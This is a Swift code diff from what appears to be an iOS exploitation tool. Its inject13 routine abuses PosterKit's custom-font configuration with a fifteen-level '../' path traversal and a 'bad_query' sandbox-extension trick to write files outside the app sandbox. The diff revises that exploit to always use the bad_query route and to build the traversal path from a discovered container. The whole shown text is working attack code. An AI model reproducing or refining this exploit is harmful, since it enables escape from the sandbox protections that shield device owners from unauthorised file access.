@@ -3776,7 +3776,7 @@ class SymHandler {
 
     @discardableResult
     static func inject13() -> String {
-        var diag = ["=== Inject v13-r13 (PRPosterCustomTimeFontConfiguration path-traversal) \(Date()) iOS 26.5 ==="]
+        var diag = ["=== Inject v13-r14 (PRPosterCustomTimeFontConfiguration path-traversal) \(Date()) iOS 26.5 ==="]
         let fm = FileManager.default
 
         for fw in ["/System/Library/PrivateFrameworks/PosterKit.framework/PosterKit",
@@ -3905,14 +3905,15 @@ class SymHandler {
         }
         diag.append("probe font -> PB Caches: \(fontWriteOK ? "OK \(fontFilePath)" : "FAIL")")
 
-        // If we can stat an arbitrary system path, no-sandbox entitlement is active and we
-        // can write anywhere directly without needing bad_query sandbox extensions.
-        let noSandbox = fm.fileExists(atPath: "/var/mobile/Containers/Data")
+        // Sideloadly strips injected entitlements; no-sandbox is never active.
+        // Always use bad_query for sandbox extensions.
+        let noSandbox = false
         diag.append("no-sandbox: \(noSandbox)")
 
         let traversalPrefix = String(repeating: "../", count: 15)
-        let pbFontPath = traversalPrefix
-            + "var/mobile/Containers/Data/Application/\(uuid)/Library/Caches/\(fontFileName)"
+        // Use discovered container path (may be InternalDaemon, not Application)
+        let containerRelPath = container.hasPrefix("/") ? String(container.dropFirst()) : container
+        let pbFontPath = traversalPrefix + "\(containerRelPath)/Library/Caches/\(fontFileName)"
 
         _PP13CustomFontConfigProxy.fontPostScriptName = "pp-probe-13"
         _PP13CustomFontConfigProxy.extensionBundleRelativeFilePath = pbFontPath
@@ -3930,12 +3931,12 @@ class SymHandler {
         let extVer = SymHandler.getExtensionVersion()
         let extBase = container + "/Library/Application Support/PRBPosterExtensionDataStore/\(extVer)/Extensions"
         diag.append("extBase: \(extBase)")
-        let extBaseH: BadQueryHandle? = noSandbox ? nil : (try? BadQuery.consume(path: extBase, create: true))
+        let extBaseH: BadQueryHandle? = try? BadQuery.consume(path: extBase, create: true)
         defer { extBaseH?.release() }
-        guard noSandbox || extBaseH != nil else {
+        guard extBaseH != nil else {
             diag.append("extBase NOACCESS"); return pbSave(diag)
         }
-        diag.append("extBase access: \(noSandbox ? "direct" : "bad_query")")
+        diag.append("extBase access: bad_query")
         let allExts = (try? fm.contentsOfDirectory(atPath: extBase)) ?? []
         diag.append("extBase contents (\(allExts.count)): \(allExts.prefix(5).joined(separator: ", "))")
 
